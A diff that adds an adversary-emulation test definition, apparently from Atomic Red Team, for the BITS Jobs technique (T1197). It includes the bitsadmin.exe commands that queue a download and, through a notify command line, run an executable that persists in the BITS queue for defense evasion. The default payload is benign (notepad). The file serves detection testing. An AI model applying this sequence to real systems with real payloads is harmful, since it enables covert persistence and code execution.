@@ -1,0 +1,46 @@
+{
+    "name": "Persist, Download, & Execute",
+    "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps. Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable. This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of svchost.exe and an Initiating Process Command Line of svchost.exe -k netsvcs -p -s BITS This job will remain in the BITS queue until complete or for up to 90 days by default if not removed. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL\nbitsadmin.exe /resume #{bits_job_name}\nping -n 5 127.0.0.1 >nul 2>&1\nbitsadmin.exe /complete #{bits_job_name}\n",
+        "cleanup_command": "del #{local_file} >nul 2>&1\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1197",
+    "tactics": [
+        "Persistence",
+        "Defense Evasion"
+    ],
+    "technique": "BITS Jobs",
+    "source": "ART",
+    "uuid": "62a06ec5-5754-47d2-bcfc-123d8314c6ae",
+    "arguments": {
+        "command_path": {
+            "description": "Path of command to execute",
+            "type": "path",
+            "default": "C:\\Windows\\system32\\notepad.exe"
+        },
+        "bits_job_name": {
+            "description": "Name of BITS job",
+            "type": "string",
+            "default": "AtomicBITS"
+        },
+        "local_file": {
+            "description": "Local file path to save downloaded file",
+            "type": "path",
+            "default": "%temp%\\bitsadmin3_flag.ps1"
+        },
+        "remote_file": {
+            "description": "Remote file to download",
+            "type": "url",
+            "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
